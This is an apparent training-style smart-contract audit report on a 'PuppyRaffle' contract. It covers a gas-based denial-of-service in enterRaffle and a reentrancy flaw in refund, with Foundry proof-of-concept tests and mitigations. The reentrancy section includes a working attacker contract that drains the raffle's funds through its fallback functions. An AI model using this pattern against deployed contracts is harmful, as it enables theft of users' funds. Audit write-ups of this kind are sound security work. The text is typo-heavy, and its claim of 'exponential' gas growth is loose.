## [M-H] Looping thriugh players aray to check for duplicate in `PuppyRaffle::enterRaffle` is a Potential DOS attack. (Root Cause + Impact)

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `playwrs` array to chck for duplicate. However gas cost accumulates exponentially new checks new players make new checks. Every additional address in the `players` array, is an additional cheeck the loop will have to make.

**Impact:** The gas cost for Raffle rntrsnt will greately increase as more player enters the raffle. this will discourage later users from entering and causing s rush at the start of raffle. 

An attacker might make the `PuppyRaffle::entrants` array to be so big, that no one else enters, saving the win stakes for themselves.

**Proof of Concept:**

if we have two sets of 100 players enter, the cost of gas will be such as:

-  gas cost of the first 100 players: 6252128
- gas cost of the Second 100 players: 18068218

this is more than 3X more expensive for the 2nd 100 players.

<details>
<summary>Proof of code</summary>

Include the following test into `PuppyRaffleTest.t.sol`

```javascript
 function testDosForEnterRaffleFunction () public {

        vm.txGasPrice(1);

        // Let's enter 100 players
        uint256 playerNum = 100;
        address [] memory players = new address[](playerNum);
        for (uint256 i = 0; i < playerNum; i++){
            players[i] = address(i);
        }
        
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee*players.length}(players);
        uint256 gasEnd = gasleft();


        uint256 gasUsedFirst = (gasStart - gasEnd)*tx.gasprice;
        console.log("gas cost of the first 100 players:", gasUsedFirst);


        // for the 2nd 100 players

      address [] memory playersTwo = new address[](playerNum);
        for (uint256 i = 0; i < playerNum; i++){
            playersTwo[i] = address(i + playerNum); // address 101, 102, 103...
        }
        
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee*players.length}(playersTwo);
        uint256 gasEndSecond = gasleft();


        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond)*tx.gasprice;
        console.log("gas cost of the Second 100 players:", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);


    }
```
</details>

**Recommended Mitigation:** Recommendations include;
- Consider allowing duplicates. Here, users can create unique wallets and enter the raffle multiple times.

- Consider using mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.  



## [H-#] `PuppyRaffle::refund` External function call before updating state leaving room for a reentrancy attack.

**Description:** The refund function in the PuppyRaffle contract allows an attacker to exploit a reentrancy vulnerability. The external call to transfer funds (via refund()) is made before updating the contract's state, enabling an attacker to repeatedly call the refund function through a fallback mechanism, thereby draining the contract's balance.

**Impact:** High 

**Proof of Concept:**

If the starting balance of the attacker contract is 0 ETH and the starting contract balance is 4 ETH, after an attack by the ReentrencyAttacker contract, as seen below, the contract balance will be drained to zero:

- Ending attacker contract balance: 5 ETH
- Ending contract balance: 0 ETH

<details>
Please include the code below in the PuppyRaffle.t.sol
<summary>Proof of code</summary>

```javascript
contract ReentrencyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```
</details>


**Recommended Mitigation:**

- Use Reentrancy Guard: Consider implementing the ReentrancyGuard pattern to prevent multiple calls to the same function during the execution process.

- Checks-Effects-Interactions Pattern: Always follow the best practice of the checks-effects-interactions pattern, which involves checking conditions, updating state, and interacting with external contracts only after the state has been updated.